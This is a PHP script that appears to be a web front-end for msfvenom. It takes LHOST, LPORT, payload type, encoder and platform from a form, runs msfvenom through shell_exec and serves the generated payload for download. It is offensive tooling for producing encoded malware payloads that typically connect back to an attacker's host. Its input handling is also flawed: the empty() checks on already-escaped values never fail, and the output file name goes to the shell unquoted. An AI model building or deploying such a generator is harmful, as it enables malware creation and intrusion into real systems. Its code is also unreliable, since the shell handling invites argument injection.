<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $payload_type = escapeshellarg($_POST['payload-type']);
    $lhost = escapeshellarg($_POST['lhost']);
    $lport = escapeshellarg($_POST['lport']);
    $output_format = escapeshellarg($_POST['output-format']);
    $encoder = escapeshellarg($_POST['encoder']);
    $iterations = (int)$_POST['iterations']; // Ensuring it's an integer
    $bad_chars = escapeshellarg($_POST['bad-chars']);
    $architecture = escapeshellarg($_POST['architecture']);
    $platform = escapeshellarg($_POST['platform']);
    
    // Validate input values
    if (!filter_var(trim($_POST['lhost']), FILTER_VALIDATE_IP)) {
        die("Invalid LHOST IP address.");
    }
    if (!is_numeric($_POST['lport']) || $_POST['lport'] <= 0 || $_POST['lport'] > 65535) {
        die("Invalid LPORT number.");
    }

    // Define payload output file
    $output_file = "payload." . escapeshellcmd($_POST['output-format']);

    // Construct msfvenom command
    $command = "msfvenom -p $payload_type LHOST=$lhost LPORT=$lport ";
    if (!empty($encoder)) {
        $command .= "-e $encoder ";
    }
    if ($iterations > 0) {
        $command .= "-i $iterations ";
    }
    if (!empty($bad_chars)) {
        $command .= "-b $bad_chars ";
    }
    $command .= "-a $architecture --platform $platform -f $output_format -o $output_file";

    // Execute the command
    $output = shell_exec($command);
    if (!file_exists($output_file)) {
        die("Failed to generate the payload.");
    }

    // Provide file for download
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($output_file) . '"');
    readfile($output_file);
    unlink($output_file); // Delete file after download
    exit;
}
?>
